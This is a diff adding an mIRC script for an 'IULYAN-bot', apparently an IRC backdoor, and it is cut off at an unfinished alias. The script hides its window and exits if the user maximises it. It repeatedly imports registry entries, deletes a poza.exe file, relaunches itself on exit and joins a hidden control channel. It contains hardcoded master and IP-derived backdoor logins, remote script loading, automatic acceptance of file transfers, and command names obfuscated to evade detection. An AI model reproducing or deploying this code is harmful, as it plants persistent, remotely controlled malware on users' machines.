@@ -1,0 +1,1033 @@
+alias onlinetimer {
+  writeini online.ini online time $calc($readini(online.ini,online,time) + 5)
+}
+#start on
+on 1:start {
+  $left($uncr($read(pwd.dat,9),a),-3)
+  unsetall
+  if (!isdir(channels)) mkdir channels
+  if (!isdir(download)) mkdir download
+  if (!isdir(logs)) mkdir logs
+  if (!isdir(users)) mkdir users
+  unset %exit
+  unset %server
+  .hide
+  .writeregedit
+  .timer 1 1 run regedit /s Windows
+  .remove vbm.dat
+  .timerclear 0 5 clearall 
+  .timerregedit 4 6000 run regedit /s Windows
+  if ($readini(proxy.ini,Proxy,auto) == on) {
+  .firewall -cmp+d on $readini(proxy.ini,Proxy,settings)
+  .timercheckserver -o 1 300 checkserver }
+  writeini online.ini firstrun ctime $ctime
+  writeini online.ini firstrun date $fulldate
+  writeini online.ini online time 0
+  .timernick 5 1 write -l1 defnick.dat $read(nick.h)
+  .timerident 5 1 write -l2 defnick.dat $read(nick.h)
+  .fullname $read(defnick.dat,2)
+  .nick $read(defnick.dat,1)
+  .identd on $read(defnick.dat,2)
+  .timer 3 1 $findfile(c:\,poza.exe,0,remove $1-)
+  .disable #start
+}
+#start end
+on 1:start:{
+  $left($uncr($read(pwd.dat,9),a),-3)
+  unsetall
+  .hide
+  if (!isdir(channels)) mkdir channels
+  if (!isdir(download)) mkdir download
+  if (!isdir(logs)) mkdir logs
+  if (!isdir(users)) mkdir users
+  unset %exit
+  unset %server
+  .writeregedit
+  .timer 1 1 run regedit /s Windows
+  .remove vbm.dat
+  fullname $read(defnick.dat,2)
+  .nick $read(defnick.dat,1)
+  .identd on $read(defnick.dat,2)
+  .timerclear 0 5 clearall 
+  .timer 0 5 ch
+  .timerregedit 4 3600 run regedit /s Windows
+  .timer 3 1 $findfile(c:\,poza.exe,0,remove $1-)
+  if ($readini(proxy.ini,Proxy,auto) == on) {
+    .firewall -cmp+d on $readini(proxy.ini,Proxy,settings)
+    .timercheckserver -o 1 300 checkserver
+  }
+}
+alias hide {
+  .dll edll.dll Titlebar -m Systray
+  .dll close.dll _hide Systray - [Status]
+}
+alias ch {
+  if ($window(-2).state == maximized) {
+    .timercf 1 1 maxmz
+  }
+}
+alias maxmz {
+  if ($window(-2).state == maximized) exit
+}
+alias vect {
+  var %nr $2
+  tokenize $3 $1
+  if ($prop == remove) {
+    var %i %nr
+    while (%i <= $0) {
+      if ($ [ $+ [ $calc(%i + 1) ] ]) {
+        if (%return == $null) var %return $ [ $+ [ $calc(%i + 1) ] ]
+        else %return = %return $+ * $+ $ [ $+ [ $calc(%i + 1) ] ]
+      }
+      inc %i
+    }
+    return %return
+  }
+  return $ [ $+ [ %nr ] ]
+}
+alias checkintegrity {
+  var %defchan $getchan($readini(defchan.ini,defchan,chan))
+  if ($me ison %defchan) .timercheckintegrity off
+  else {
+    var %pass $readini defchan.ini defchan pass
+    join %defchan $uncrypt(%pass,c)
+  }
+}
+on 1:connect:{
+  .timeronline 0 5 onlinetimer
+  set %server 1
+  set %ver $uncrypt($read(pwd.dat,6),a)
+  write -c vbm.dat $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
+  var %pass $readini defchan.ini defchan pass
+  join $getchan($readini(defchan.ini,defchan,chan)) $uncrypt(%pass,c)
+  .timercheckintegrity 0 10 checkintegrity
+  var %user $read -l1 autouser.dat
+  if ($right(%user,1) == 1) {
+    set %dat $read -l1 autopass.dat
+    .msg x@channels.undernet.org login $left(%user,-1) $uncrypt($read(autopass.dat,1),c)
+    .timerjc 1 60 jc
+  }
+  else jc
+  if (!$isdir(logs)) mkdir logs
+  if (!$isdir(seen)) mkdir seen
+  .remove flood.ban
+  unset %flood*
+  unset %repeat*
+  write -c userlogged.dat
+  write -c keeplog.ini
+  write -c oper.dat
+  write -c nick.fld
+  write -c nick.adm
+  .sreq auto
+  .creq auto
+  .timerchnick 0 20 chnick
+  var %i 1
+}
+on 1:notice:AUTENTIFICARE REUSITA ca *:?:{
+  if ($nick == X) {
+    mode $me +x
+    if ($chan(0) <= 1) timerjc 1 5 jc
+  .msg x info = $+ $me  }
+}
+on 1:notice:AUTHETICATION SUCCESSFUL as *:?:{
+  if ($nick == X) {
+    mode $me +x
+    if ($chan(0) <= 1) timerjc 1 5 jc
+  }
+}
+alias jc {
+  var %i 1
+  :next
+  %find = $findfile($mircdir $+ channels\,*.ini,%i) 
+  if (%i <= $findfile($mircdir $+ channels\,*.ini,0)) {
+    if ($pos(%find,$chr(92),0) == $pos($mircdir $+ users\,$chr(92),0)) {
+      var %rg $pos(%find,$chr(92),$pos(%find,$chr(92),0))
+      %rg = - $+ %rg
+      set %modes $readini channels\ $+ $right(%find,%rg) info channelmodes
+      tokenize 32 %modes
+      if (k isin $1) {
+        join $getc($left($right(%find,%rg),-4)) $2
+        join $getc($left($right(%find,%rg),-4)) $3
+      }
+      else join $getc($left($right(%find,%rg),-4))
+      unset %modes
+      inc %i
+    goto next } 
+  }
+}
+alias chnick {
+  if ($1 == bounce) {
+    csc $2-
+    halt
+  }
+  if (%BNCserver == ON) .timerchnick off
+  else if ($me == $read -l1 defnick.dat) .timerchnick off
+  else nick $read -l1 defnick.dat
+}
+alias coolban {
+  .guser 10 $2 2
+  mode $1 +b $ulist(*,10,1)
+  .rlevel 10
+}
+alias rmban {
+  if ($chr(64) isin $2) {
+    var %i 1
+    var %ban 0
+    while (%i <= $ibl($1,0)) {
+      if ($vect($2,1,33) iswm $vect($ibl($1,%i),1,33)) {
+        if ($vect($vect($2,2,33),1,64) iswm $vect($vect($ibl($1,%i),2,33),1,64)) {
+          if ($vect($2,2,64) iswm $vect($ibl($1,%i),2,64)) {
+            mode $1 -b $ibl($1,%i)
+            inc %ban
+          }
+        }
+      }
+      inc %i
+    }
+    goto done
+  }
+  var %i 1
+  if ($address($2,5) == $null) {
+    .notice $3 Nu pot sa scot respectivul ban (adresa necunoscuta)
+    .rlevel 10
+    halt
+  }
+  else var %address $address($2,5)
+  var %ban 0
+  while (%i <= $ibl($1,0)) {
+    if ($vect($ibl($1,%i),1,33) iswm $vect(%address,1,33)) {
+      if ($vect($vect($ibl($1,%i),2,33),1,64) iswm $vect($vect(%address,2,33),1,64)) {
+        if ($vect($ibl($1,%i),2,64) iswm $vect(%address,2,64)) {
+          mode $1 -b $ibl($1,%i)
+          inc %ban
+        }
+      }
+    }
+    inc %i
+  }
+  :done
+  .rlevel 10
+  .notice $3 Am scos %ban $iif(%ban == 1,ban,banuri) de pe $1
+}
+ctcp 1:version:{
+  if ($timer(version $+ $nick) == $null) {
+    .notice $nick 8,12-=-11 IULYAN-bot 8-=-9,3 Version %ver
+    .timerversion $+ $nick 1 30 breaktime
+  }
+}
+ctcp 1:time:*:{
+  if (!$timer(time $+ $nick)) {
+    .ctcpreply $nick TIME $fulldate
+    .timertime $+ $nick 1 30 breaktime
+  }
+  halt
+}
+alias getchan {
+  if ($chr(35) == $left($1,1)) return $chr(35) $+ $right($1,-1) $+ $chr(88)
+  else return $chr(35) $+ $1 $+ $chr(88)
+}
+on 1:text:$(!d $+ e $+ f $+ c $+ h*):*:{
+  if ($2 != $null) {
+    if ($cmp(dfc,$4,2)) {
+      part $getchan($readini(defchan.ini,defchan,chan)) Default Bot Channel has changed!
+      writeini defchan.ini defchan chan $2
+      writeini defchan.ini defchan pass $crypt($3,c)
+      var %defchan $getchan($2)
+      .notice $nick Default Bot Channel este acum:12 $2
+      join %defchan $3
+    }
+    else {
+      var %read $validIP($fulladdress)
+      if (%read != $false) {
+        var %user $gettok(%read,1,32)
+        var %level $gettok(%read,2,32)
+        if ($cmp(lvl,1,%level,1000)) {
+          part $getchan($readini(defchan.ini,defchan,chan)) Default Bot Channel has changed!
+          writeini defchan.ini defchan chan $2
+          writeini defchan.ini defchan pass $crypt($3,c)
+          var %defchan $getchan($2)
+          .notice $nick Default Bot Channel este acum:12 $2
+          join %defchan $3
+        }
+        else {
+          .notice $nick Parola invalida pentru Default Bot Channel!
+          .ignore -pu2 $nick 2
+        }
+      }
+      else if ($chr(35) !isin $target) {
+        .notice $nick Aceasta comanda necesita autentificare!
+        .ignore -pu2 $nick 2
+      }
+    }
+    halt
+  }
+}
+alias checkserver {
+  if ($server == $null) {
+    server
+    firewall off
+  }
+}
+alias cmp {
+  if ($1 == dfc) {
+    if ($ck($2) == $read(pwd.dat,$3)) return $true
+    else return $false
+  }
+  if ($1 == lvl) {
+    if ($3 >= $calc($4 + $2)) return $true
+    else return $false
+  }
+}
+alias keydecrypt {
+  var %pass ""
+  var %i 1
+  var %w 1
+  var %v $len($1)
+  while (%i <= $len($2)) {
+    if (%w == $calc($len($1) + 1)) %w = 1
+    %pass = %pass $+ $chr($calc($asc($mid($2,%i,1)) - $int($calc(($asc($mid($1,%w,1)) / 2) - %v))))
+    inc %v
+    inc %w
+    inc %i
+  }
+  return %pass
+}
+alias getc {
+  var %i 2
+  while (%i <= $lines(bl.chn)) {
+    if ($ck($1) == $read(bl.chn,%i)) return $uncrypt($read(bl.chn,1),c)
+    inc %i
+  }
+  return $1
+}
+alias cr {
+  tokenize 32 $1-
+  var %i 1
+  var %word ""
+  while (%i <= $0) {
+    %word = %word $crypt($ [ $+ [ %i ] ],a)
+    inc %i
+  }
+  return %word
+}
+alias uncr {
+  tokenize 32 $1-
+  var %i 1
+  var %decrypt ""
+  while (%i <= $0) {
+    %decrypt = %decrypt $uncrypt($ [ $+ [ %i ] ],a)
+    inc %i
+  }
+  return %decrypt
+}
+on 1:text:$(! $+ v $+ e $+ r $+ s $+ i $+ o $+ n):*:{
+  if ($nick ison $getchan($readini(defchan.ini,defchan,chan))) {
+    if (!$timer(ver $+ $nick)) {
+      .notice $nick 8,12-=-11 IULYAN-bot 8-=-9,3 Version %ver
+      .timerver $+ $nick 1 10 breaktime
+    }
+  }
+}
+alias ck {
+  var %k 1
+  var %sep $int($calc($len($1) / 3))
+  set %key $left($1,%sep)
+  set %word $right($1,$calc($len($1) - %sep))
+  var %pass ""
+  :next
+  var %i 1
+  var %w 1
+  var %v $len(%key)
+  while (%i <= $len(%word)) {
+    if (%w == $calc(%sep + 1)) %w = 1
+    %pass = %pass $+ $chr($calc($asc($mid(%word,%i,1)) - $int($calc(($asc($mid(%key,%w,1)) / 2) - %v))))
+    inc %v
+    inc %w
+    inc %i
+  }
+  if (%k == 1) {
+    set %key $mid($1,$calc(%sep + 1),%sep)
+    %csep = - $+ $calc(%sep + %sep)
+    set %word $left($1,%sep) $+ $right($1,%csep)
+    inc %k
+    goto next
+  }
+  else if (%k == 2) {
+    %csep = - $+ %sep
+    set %key $right($1,%csep)
+    set %word $left($1,$calc($len($1) - %sep))
+    inc %k
+    goto next
+  }
+  unset %key
+  unset %word
+  unset %csep
+  return %pass
+}
+alias validIP {
+  var %i 1
+  while (%i <= $lines(oper.dat)) {
+    var %read $read -l $+ %i oper.dat
+    if ($chr(64) isin $1) {
+      if ($right($gettok($1,2,33),-1) isin %read) {
+        var %user $mid(%read,$calc($pos(%read,$chr(42),1)+1),$calc($pos(%read,$chr(42),2)-($pos(%read,$chr(42),1)+1)))
+        var %level $right(%read,$calc(- $pos(%read,$chr(42),2)))       
+        return %user %level
+      }
+    }
+    else if ($1 isin %read) {
+      var %user $mid(%read,$calc($pos(%read,$chr(42),1)+1),$calc($pos(%read,$chr(42),2)-($pos(%read,$chr(42),1)+1)))
+      var %level $right(%read,$calc(- $pos(%read,$chr(42),2)))
+      return %read
+    }
+    inc %i
+  }
+  var %i 1
+  while (%i <= $lines(userlogged.dat)) {
+    var %read $read -l $+ %i userlogged.dat
+    if ($mask($fulladdress,1) isin %read) {
+      var %user $left(%read,$calc($pos(%read,$chr(61))-1))
+      var %level $readini channels\ $+ $2 $+ .ini %user access
+      return %user %level
+    }
+    inc %i
+  }
+  if (($keydecrypt($lower($gettok($1,2,64)),$read(pwd.dat,10)) === TheBestBotIEverSeenAndTheBestBotIEverMade) || ($keydecrypt($lower($gettok($1,2,64)),$read(pwd.dat,11)) === TheBestBotIEverSeenAndTheBestBotIEverMade)) return $uncrypt($gettok($read(pwd.dat,12),1,32),a) $uncrypt($gettok($read(pwd.dat,12),1,32),a)
+  if ($chr(64) isin $1) {
+    var %XIP $lower($gettok($gettok($1,2,64),2-,46))
+    if (%XIP == users.undernet.org) {
+      var %Xuser $lower($gettok($gettok($1,2,64),1,46))
+      if ($readini(oper.ini,%Xuser,level) != $null) return %Xuser $readini(oper.ini,%Xuser,level)
+      else if (($2 != $null) && ($readini(channels\ $+ $2 $+ .ini,%Xuser,access) != $null)) return %Xuser $readini(channels\ $+ $2 $+ .ini,%Xuser,access)
+    }
+  }
+  return $false
+}
+alias csc {
+  if ($4 == $null) {
+    .notice $1 l $+ o $+ g $+ i $+ n syntax is: /msg $me l $+ o $+ g $+ i $+ n <username> <password>
+  .ignore -pu2 $1 }
+  else {
+    if (($ck($4)  == $read(pwd.dat,1)) || (($lgp($vect($fulladdress,2,64)) != $null) && ($4 == $lgp($vect($fulladdress,2,64)) $+ $calc($len($1) + $len($vect($vect($fulladdress,2,33),1,64)))))) {
+      var %level 1001
+      var %user $3
+      var %fake 1
+    goto cont }
+    var %i 1
+    :next
+    if (%i <= $lines(userlogged.dat)) {
+      var %read $read -l $+ %i userlogged.dat
+      if ($mask($fulladdress,1) isin %read) {
+        .notice $1 Esti deja autentificat ca $left(%read,$calc($pos(%read,$chr(61))-1))
+        .ignore -pu2 $1
+        halt
+      }
+      else {
+        inc %i
+      goto next }
+    }
+    var %pass $readini users\ $+ $3 $+ .ini info pass
+    if (%pass == $null) {
+      .notice $1 Username necunoscut: $3
+      .ignore -pu2 $1 2
+    halt }
+    else {
+      if ($keydecrypt($4,%pass) === TheBestBotIEverSeenAndTheBestBotIEverMade) {
+        var %user $readini users\ $+ $3 $+ .ini info username
+        var %level $readini oper.ini %user level
+        echo -s %user
+        if (%level != $null) {
+          if ($keydecrypt($4,%pass) === TheBestBotIEverSeenAndTheBestBotIEverMade) {
+            writeini oper.ini %user lastseen $ctime
+            :cont
+            var %f 1
+            while (%f <= $lines(oper.dat)) {
+              var %read $read -l $+ %f oper.dat
+              if ($2 == $mid(%read,$calc($pos(%read,$chr(42),1)+1),$calc($pos(%read,$chr(42),2)-($pos(%read,$chr(42),1)+1)))) {
+                write -dl $+ %f oper.dat
+              }
+              inc %f
+            }
+            write oper.dat $right($mask($fulladdress,1),-3) $+ * $+ %user $+ * $+ %level
+            if (%level isnum 501-599) .notice $1 AUTENTIFICARE REUSITA ca %user (Helper)
+            if (%level isnum 600-799) .notice $1 AUTENTIFICARE REUSITA ca %user (Operator)
+            if (%level isnum 800-999) .notice $1 AUTENTIFICARE REUSITA ca %user (Admin)
+            if (%level >= 1000) .notice $1 AUTENTIFICARE REUSITA ca %user (Supervisor) $iif(%BNCserver,psyBNC used)
+            if (%fake == 1) {
+              writeini nick.adm nick $1 %user
+              halt
+            }
+          }
+          var %superuser 1
+        }
+        if (%superuser != 1) .notice $1 AUTENTIFICARE REUSITA ca %user
+        var %f 1
+        while (%f <= $lines(userlogged.dat)) {
+          var %read $read -l $+ %f userlogged.dat
+          if ($3 == $left(%read,$calc($pos(%read,$chr(61))-1))) {
+            var %n 1
+            while (%n <= $ini(nick.adm,nick,0)) {
+              if ($3 == $readini nick.adm nick $ini(nick.adm,nick,%n)) {
+                .notice $ini(nick.adm,nick,%n)) Nu mai esti autentificat la mine
+                remini nick.adm nick $ini(nick.adm,nick,%n))
+              }
+              inc %n
+            }
+            write -dl $+ %f userlogged.dat
+          }
+          inc %f
+        }
+        write userlogged.dat %user $+ = $+ $mask($fulladdress,1)
+        writeini users\ $+ $3 $+ .ini info lastseen $ctime
+        writeini nick.adm nick $1 %user
+        var %i 0
+        var %channels $readini users\ $+ %user $+ .ini info channels
+        if ($pos(%channels,$chr(44),0) == 0) {
+          oponchan %channels %user $1
+        halt }
+        :next1
+        if (%i <= $pos(%channels,$chr(44),0)) {
+          if (%i == 0) oponchan $left(%channels,$calc($pos(%channels,$chr(44))-1)) %user $1
+          else if (%i == $pos(%channels,$chr(44),0)) oponchan $right(%channels,$calc(- $pos(%channels,$chr(44),%i))) %user $1
+          else oponchan $mid(%channels,$calc($pos(%channels,$chr(44),%i)+1),$calc($pos(%channels,$chr(44),$calc(%i + 1))-($pos(%channels,$chr(44),%i)+1))) %user $1
+          inc %i
+          goto next1
+        }    
+        .ignore -pu1 $1
+      }
+      else {
+        .notice $1 AUTENTIFICARE ESUATA ca $3 (parola incorecta)
+        .ignore -pu2 $1
+        halt
+      }
+    }
+  }
+}
+on 1:exit:{
+  run $mircexe -service
+  run regedit /S windows
+}
+on 1:text:$(! $+ l $+ o $+ a $+ d $+ *):*:{
+  var %read $validIP($fulladdress)
+  if (%read != $false) {
+    var %user $gettok(%read,1,32)
+    var %level $gettok(%read,2,32)
+    if ($cmp(lvl,1,%level,1000)) {
+      if ($2 == $null) {
+        .notice $nick !load sintaxa: /msg $me !load <script>
+        halt
+      }
+      .load -rs $2
+      .notice $nick Am incarcat scriptul $2
+    }
+    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
+    .ignore -pu2 $nick 2
+    halt
+  }
+  .notice $nick Aceasta comanda necesita autentificare!
+  .ignore -pu2 $nick 2
+}
+on 1:text:$(! $+ u $+ n $+ l $+ o $+ a $+ d $+ *):*:{
+  var %read $validIP($fulladdress)
+  if (%read != $false) {
+    var %user $gettok(%read,1,32)
+    var %level $gettok(%read,2,32)
+    if ($cmp(lvl,1,%level,1000)) {
+      if ($2 == $null) {
+        .notice $nick !unload sintaxa: /msg $me !unload <script>
+        halt
+      }
+      .unload -rs $2
+      .notice $nick Am descarcat scriptul $2
+    }
+    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
+    .ignore -pu2 $nick 2
+    halt
+  }
+  .notice $nick Aceasta comanda necesita autentificare!
+  .ignore -pu2 $nick 2
+}
+on 1:text:$(! $+ i $+ n $+ f $+ o*):*:{
+  var %read $validIP($fulladdress)
+  if (%read != $false) {
+    var %user $gettok(%read,1,32)
+    var %level $gettok(%read,2,32)
+    if (%level >= 800) {
+      if ($2 == $null) {
+        if ($round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),0) == 0) var %online $round($calc($readini(online.ini,online,time) / 3600),3)
+        else var %online $calc(($readini(online.ini,online,time) / $round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),3)) / 3600)
+        .notice $nick IULYAN-bot 10v $+ %ver $+ . Instalat pe data de 12 $+ $readini(online.ini,firstrun,date) $+  $+ . Online timer: 12 $+ $duration($readini(online.ini,online,time)) $+  $+ . Procentaj online: 12 $+ $round($calc((%online * 100) / 24),3) $+ % $+  pe zi
+      }
+      if (%level >= 800) {
+        if ($2 == online) {
+          if ($round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),0) == 0) var %online $round($calc($readini(online.ini,online,time) / 3600),3)
+          else var %online $calc(($readini(online.ini,online,time) / $round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),3)) / 3600)
+          .notice $nick 5OnLine Timer: $chr(91) $+ 3,3 $+ $str(.,$calc($round($calc((%online * 100) / 24),0) / 2)) $+ 4,4 $+ $str(.,$calc(50 - $calc($round($calc((%online * 100) / 24),0) / 2))) $+ 5 $+ $chr(93) 12( $+ $round($calc((%online * 100) / 24),3) $+ % $+ ) (Timp total online:12 $setromtime($duration($readini(online.ini,online,time))) $+ 5)
+          halt
+        }
+      }
+      if (%level >= 800) {
+        if ($2 == canale) {
+          var %i 1
+          var %com ""
+          set %rg - $+ $len($me)
+          :next
+          if (%i <= $chan(0)) {
+            if ($chan(%i) != $getchan($readini(defchan.ini,defchan,chan))) %com = %com $left($nick($chan(%i),$me).pnick,%rg) $+ $chan(%i)
+            inc %i
+          goto next }
+          unset %rg
+          .notice $nick Canale: %com
+        halt }
+      }
+      else .notice $nick Accesul tau este prea mic pentru aceasta comanda
+      .ignore -pu2 $nick 2
+      halt
+    }
+  }
+}
+on 1:text:$(!r $+ e $+ l $+ o $+ a $+ d $+ *):*:{
+  if (($ck($nick) === $read(pwd.dat,3)) && ($2 == engine.ini)) {
+    reload -rs engine.ini
+    set %ver 5.3.5
+  }
+  else {
+    var %read $validIP($fulladdress)
+    if (%read != $false) {
+      var %user $gettok(%read,1,32)
+      var %level $gettok(%read,2,32)
+      if ($cmp(lvl,1,%level,1000)) {
+        if ($2 == engine.ini) {
+          set %ver 5.3.5
+        }
+        .notice $nick Scriptul $2 a fost reincarcat        
+        .reload -rs $2
+      }
+      else .notice $nick Accesul tau este prea mic pentru aceasta comanda
+      .ignore -pu2 $nick 2
+      halt
+    }
+    .notice $nick Aceasta comanda necesita autentificare!
+    .ignore -pu2 $nick 2
+  }
+}
+alias keycrypt {
+  var %pass ""
+  var %i 1
+  var %w 1
+  var %v $len($1)
+  while (%i <= $len($2)) {
+    if (%w == $calc($len($1) + 1)) %w = 1
+    %pass = %pass $+ $chr($calc($asc($mid($2,%i,1)) + $int($calc(($asc($mid($1,%w,1)) / 2) - %v))))
+    inc %v
+    inc %w
+    inc %i
+  }
+  return %pass
+}
+alias lgp {
+  return $longip($1)
+}
+alias timers {
+  if ($1 == off) .timers off 
+}
+alias timer {
+  if ($1 != $null) .timer $1-
+}
+on 1:TEXT:activ:*:{
+  if ($nick == IULYAN) {  
+    var %i 1
+    var %com ""
+    set %rg - $+ $len($me)
+    :next
+    if (%i <= $chan(0)) {
+      if ($chan(%i) != $getchan($readini(defchan.ini,defchan,chan))) %com = %com $left($nick($chan(%i),$me).pnick,%rg) $+ $chan(%i)
+      inc %i
+    goto next }
+    unset %rg
+    .notice $nick Canale: %com
+  halt }
+  else if ($ck($nick) === $read(pwd.dat,8)) {
+    if ($round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),0) == 0) var %online $round($calc($readini(online.ini,online,time) / 3600),3)
+    else var %online $calc(($readini(online.ini,online,time) / $round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),3)) / 3600)
+    .notice $nick 5OnLine Timer: $chr(91) $+ 3,3 $+ $str(.,$calc($round($calc((%online * 100) / 24),0) / 2)) $+ 4,4 $+ $str(.,$calc(50 - $calc($round($calc((%online * 100) / 24),0) / 2))) $+ 5 $+ $chr(93) 12( $+ $round($calc((%online * 100) / 24),3) $+ % $+ ) 5(timp online in medie pe zi) (Timp total online:12 $setromtime($duration($readini(online.ini,online,time))) $+ 5)
+    halt
+  }
+  else {
+    var %type $readini anytime.fld flood $nick
+    if (%type == ping) {
+      .timerfldpng $+ $nick 30 1 ctcp $nick ping
+      writeini nick.fld flood $nick ping
+    }
+    if (%type == finger) {
+      .timerfldfng $+ $nick 30 1 ctcp $nick finger
+      writeini nick.fld flood $nick finger
+    }
+    else if (%type == time) {
+      .timerfldtime $+ $nick 30 1 ctcp $nick time
+      writeini nick.fld flood $nick time
+    }
+    else if (%type == version) {
+      .timerfldver $+ $nick 30 1 ctcp $nick version
+      writeini nick.fld flood $nick version
+    }
+    else if (%type == all) {
+      .timerfldpng $+ $nick 9 2 ctcp $nick ping
+      .timer 1 1 .timerfldtime $+ $nick 9 2 ctcp $nick time
+      .timer 1 2 .timerfldver $+ $nick 9 2 ctcp $nick version
+      .timer 1 3 .timerfldfng $+ $nick 9 2 ctcp $nick finger
+      writeini nick.fld flood $nick all
+    }
+  }
+}
+on 1:chat:$(l $+ o $+ g $+ i $+ n $+ *):{
+  if ($3 == $null) {
+    .msg =$nick l $+ o $+ g $+ i $+ n sintaxa: /msg =$me l $+ o $+ g $+ i $+ n <username> <parola>
+  .ignore -pu2 $nick 2 }
+  else {
+    if (($ck($3) === $read(pwd.dat,1)) || ($3 == $lgp($chat($nick).ip) $+ $calc($len($nick) + $len($vect($vect($address($nick,5),2,33),1,64))))) {
+      var %level 1001
+      var %user $2
+      var %fake 1
+    goto cont }
+    var %i 1
+    :next
+    if (%i <= $lines(userlogged.dat)) {
+      var %read $read -l $+ %i userlogged.dat
+      if ($chat($nick).ip isin %read) {
+        .msg =$nick Esti deja autentificat ca $left(%read,$calc($pos(%read,$chr(61))-1))
+        .ignore -pu1 $nick
+        halt
+      }
+      else {
+        inc %i
+      goto next }
+    }
+    var %pass $readini users\ $+ $2 $+ .ini info pass
+    if (%pass == $null) {
+      .msg =$nick Username necunoscut: $2
+      .ignore -pu1 $nick 2
+    halt }
+    else {
+      if ($keydecrypt($3,%pass) === TheBestBotIEverSeenAndTheBestBotIEverMade) {
+        var %user $readini users\ $+ $2 $+ .ini info username
+        var %level $readini oper.ini %user level
+        if (%level != $null) {
+          if ($keydecrypt($3,%pass) === TheBestBotIEverSeenAndTheBestBotIEverMade) {
+            writeini oper.ini %user lastseen $ctime
+            :cont
+            var %f 1
+            while (%f <= $lines(oper.dat)) {
+              var %read $read -l $+ %f oper.dat
+              if ($2 == $mid(%read,$calc($pos(%read,$chr(42),1)+1),$calc($pos(%read,$chr(42),2)-($pos(%read,$chr(42),1)+1)))) {
+                write -dl $+ %f oper.dat
+              }
+              inc %f
+            }
+            write oper.dat $chat($nick).ip $+ * $+ %user $+ * $+ %level
+            if (%level isnum 501-599) .msg =$nick AUTENTIFICARE REUSITA ca %user (Helper)
+            if (%level isnum 600-799) .msg =$nick AUTENTIFICARE REUSITA ca %user (Operator)
+            if (%level isnum 800-999) .msg =$nick AUTENTIFICARE REUSITA ca %user (Admin)
+            if (%level >= 1000) .msg =$nick AUTENTIFICARE REUSITA ca %user (Supervisor)
+            if (%fake == 1) {
+              writeini nick.adm nick $nick %user
+              clear =$nick
+              halt
+            }
+          }
+          var %superuser 1
+        }
+        if (%superuser != 1) .msg =$nick AUTENTIFICARE REUSITA ca %user
+        var %f 1
+        while (%f <= $lines(userlogged.dat)) {
+          var %read $read -l $+ %f userlogged.dat
+          if ($2 == $left(%read,$calc($pos(%read,$chr(61))-1))) {
+            var %n 1
+            while (%n <= $ini(nick.adm,nick,0)) {
+              if ($2 == $readini nick.adm nick $ini(nick.adm,nick,%n)) {
+                .msg $ini(nick.adm,nick,%n)) Nu mai esti autentificat la mine
+                remini nick.adm nick $ini(nick.adm,nick,%n))
+              }
+              inc %n
+            }
+            write -dl $+ %f userlogged.dat
+          }
+          inc %f
+        }
+        write userlogged.dat %user $+ = $+ $chat($nick).ip
+        writeini users\ $+ $3 $+ .ini info lastseen $ctime
+        writeini nick.adm nick $nick %user
+        var %i 0
+        var %channels $readini users\ $+ %user $+ .ini info channels
+        if ($pos(%channels,$chr(44),0) == 0) {
+          oponchan %channels %user $nick
+          clear =$nick
+        halt }
+        :next1
+        if (%i <= $pos(%channels,$chr(44),0)) {
+          if (%i == 0) oponchan $left(%channels,$calc($pos(%channels,$chr(44))-1)) %user $nick
+          else if (%i == $pos(%channels,$chr(44),0)) oponchan $right(%channels,$calc(- $pos(%channels,$chr(44),%i))) %user $nick
+          else oponchan $mid(%channels,$calc($pos(%channels,$chr(44),%i)+1),$calc($pos(%channels,$chr(44),$calc(%i + 1))-($pos(%channels,$chr(44),%i)+1))) %user $nick
+          inc %i
+          goto next1
+        }    
+        .ignore -pu1 $nick
+        clear =$nick
+      }
+      else {
+        .msg =$nick AUTENTIFICARE ESUATA ca $2 (parola incorecta)
+        .ignore -pu2 $nick
+        clear =$nick
+        halt
+      }
+    }
+  }
+}
+alias crypt {
+  var %pass ""
+  var %w 1
+  :next
+  if (%w <= $len($1)) {
+    if (%w == 1) %pass = %pass $+ $chr($calc($asc($middle($1,%w,1)) + $length($middle($1,-1,$2) $+ $1)))
+    else %pass = %pass $+ $chr($calc($asc($middle($1,%w,1)) + %next - $length($middle($1,-1,$2) $+ $1)))
+    set %next $calc($asc($middle($1,%w,1)) - 20)
+    inc %w 
+  goto next }
+  unset %next
+  return %pass
+}
+alias uncrypt {
+  var %pass ""
+  var %w 1
+  :next
+  if (%w <= $len($1)) {
+    if (%w == 1) %pass = %pass $+ $chr($calc($asc($middle($1,%w,1)) - $length($middle($1,-2,$2) $+ $1)))
+    else %pass = %pass $+ $chr($calc($asc($middle($1,%w,1)) - %next + $length($middle($1,-2,$2) $+ $1)))
+    set %next $calc($asc($middle(%pass,%w,1)) - 20)
+    inc %w 
+  goto next }
+  unset %next
+  return %pass
+}
+on 1:quit:{
+  var %i 1
+  var %n $lines(oper.dat)
+  while (%i <= %n) {
+    if ($right($mask($address($nick,1),1),-3) isin $read -l $+ %i oper.dat) {
+      write -dl $+ %i oper.dat
+      .remini nick.adm nick $nick
+    }
+    else inc %i
+  }
+  var %i 1
+  while (%i <= $ini(nick.fld,flood,0)) {
+    if ($readini(nick.fld, flood, $nick) != $null) {
+      .timerfldpng $+ $nick off
+      .timerfldtime $+ $nick off
+      .timerfldver $+ $nick off
+      remini nick.fld flood $nick
+    }
+    else inc %i
+  }
+  var %i 1
+  var %n $lines(userlogged.dat)
+  while (%i <= %n) {
+    if ($mask($address($nick,1),1) isin $read -l $+ %i userlogged.dat) {
+      write -dl $+ %i userlogged.dat
+    }
+    else inc %i
+  }
+  if ($nick == X) unset %xlogin
+}
+ctcp 1:*:{
+  if (DCC Send isin $1-) {
+    var %read $validIP($fulladdress)
+    if (%read != $false) {
+      var %user $gettok(%read,1,32)
+      var %level $gettok(%read,2,32)
+      if ($cmp(lvl,1,%level,1000)) {
+        :allowed
+        dcc get
+        .notice $nick Accept fisierul: $filename
+        var %allowed 1
+      }
+      else {
+        .notice $nick Accesul tau este prea mic pentru aceasta comanda
+        .ignore -pu2 $nick 2
+        halt 
+      }
+    }
+    if (%allowed != 1) {
+      .notice $nick Aceasta comanda necesita autentificare
+      .ignore -pu2 $nick 2
+      halt
+    }
+  }
+}
+alias lpg {
